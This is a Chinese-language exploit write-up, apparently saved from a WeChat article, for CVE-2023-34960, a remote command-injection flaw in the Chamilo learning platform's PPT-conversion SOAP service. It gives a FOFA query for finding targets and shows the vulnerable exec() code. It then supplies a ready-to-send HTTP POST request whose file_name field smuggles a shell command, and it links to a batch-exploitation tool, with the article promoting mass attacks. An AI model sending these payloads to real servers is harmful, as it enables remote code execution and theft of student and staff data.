bugs/Chamilo__CVE-2023-34960_RCE 漏洞__首发批量 EXP.md

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Eq2-9wV9D8wB2PMB1Tl4fg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hQV3W3SWhZBK1EOW7ZxMDhKAlVakoeOB0ZjYj0KVicicYiamWpWduKtTCenCuDskXn14lkF9ZE2Ko1JMQiamGxz87g/640?wx_fmt=png)

**资产介绍：**

**Chamilo** 是一个电子学习平台，也称为学习管理系统 （LMS）。自 30 年成立以来，全球已有 2010 多万人使用它。作为 LMS，它为教育课程、培训计划或学习和发展计划的管理、文档、跟踪、报告和交付提供了一个集成平台。从本质上讲，它提供了一个数字框架，可以适应学习过程的各个方面，因此，它在众多教育和企业环境中发挥着至关重要的作用。

Chamilo 应用程序处理与教学和学习相关的大量敏感信息，包括学生和教师的个人详细信息、学术记录和专有课程内容。如果处理不当或泄露，此类数据可能会导致重大后果，从侵犯隐私到知识产权盗窃。

截至 2016 年 11 月，被动社区估计在全球拥有超过 11,000,000 名用户。

**FOFA：**

```
 "Chamilo"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hQV3W3SWhZBK1EOW7ZxMDhKAlVakoeOB69xTZuNPEVehpyEhDsoPbtjPXNsp6zkedTjvuP2nIxH91HkoJFnpqQ/640?wx_fmt=png)

Go！Go！Go！

**影响版本：**  

    **Chamilo <=1.11.18**

**漏洞分析：**  

**Chamilo** 具有一项名为 Chamilo Rapid 的功能，可以轻松地将 PowerPoint（PPT）幻灯片转换为 Chamilo 上的课程。

通过使用此功能，我们在源代码中识别了一个易受攻击的文件：main/webservices/additional_webservices.php

在源代码中，我们可以识别执行转换的命令：

```
$cmd = pptConverterGetCommandBaseParams();
$cmd .= ' -w '.$w.' -h '.$h.' -d oogie "'.$tempPath.$fullFileName.'" "'.$tempPathNewFiles.$fileName.'.html"';

...
$shell = exec($cmd, $files, $return);

```

函数不会筛选文件名。通过查看使用 Chamilo Rapid 功能上传的 PPT 文件的过程，我们找到了发送到函数的 SOAP 代码的解码版本。wsConvertPpt

因此，通过作为 POST 请求：/main/webservices/additional_webservices.php

```
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost:800/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
	<SOAP-ENV:Body>
		<ns1:wsConvertPpt>
			<param0 xsi:type="ns2:Map">
				<item>
					<key xsi:type="xsd:string">file_data</key>
					<value xsi:type="xsd:string"></value>
				</item>
				<item>
					<key xsi:type="xsd:string">file_name</key>
					<value xsi:type="xsd:string">`PLACEHOLDER`.pptx</value>
				</item>
				<item>
					<key xsi:type="xsd:string">service_ppt2lp_size</key>
					<value xsi:type="xsd:string">720x540</value>
				</item>
			</param0>
		</ns1:wsConvertPpt>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>


```

通过任何系统命令更改**占位符**，它将在服务器上执行。

**漏洞复现：**

通过 SOAP 参数向`/main/webservices/additional_webservices.php`发出 POST 请求。

```
POST /main/webservices/additional_webservices.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Type: text/xml; charset=utf-8
Content-Length: 867
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://google.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{}`.pptx'|" |id||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hQV3W3SWhZBK1EOW7ZxMDhKAlVakoeOBnW7crQoyG3CzYInqpm8vmQOVicnnUuhuxhTzcvIANGOveI7RL09dnsA/640?wx_fmt=png)  

**Tips：**  

http://google.com 的位置原为目标地址，但是测试发现并不影响。

这不得上号？  

**批量 EXP/POC：**

https://github.com/YongYe-Security/Chamilo_CVE-2023-34960-EXP

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hQV3W3SWhZBK1EOW7ZxMDhKAlVakoeOBxicibV7ylvGGl55ibRSKcY6C6ceRzHC197stlXmCibU9fwTF0SrkKqGwibw/640?wx_fmt=png)